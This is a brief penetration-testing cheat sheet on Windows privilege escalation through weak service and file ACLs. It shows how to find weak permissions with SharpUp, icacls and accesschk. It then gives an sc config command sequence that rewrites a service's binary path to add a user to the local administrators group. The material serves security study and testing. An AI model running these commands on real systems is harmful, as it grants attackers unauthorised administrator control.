# File System ACLs

## **Weak Permissions - File System ACLs**

We can use `SharpUp` to check for service binaries suffering from weak ACLs.

To verify the ACLs for a specific file: `icacls C:\path\to\file`

> Ideally, you need `(I)(F)`, which means full permissions, e.g. `BUILTIN\Users` or `Everyone:(I)(F)`

To check a service's permissions: `accesschk.exe /accepteula -quvcw ServiceName`

If you have full permissions on a service, then you can add the current user to the administrators localgroup. To do so: \[Requires `CMD`]

1. `sc config ServiceName binpath="cmd /c net localgroup administrators user-name /add"`
2. `sc stop ServiceName`
3. `sc start ServiceName`
4. **Disclaimer:** when starting the service you will get an error due to the previous `sc config` command
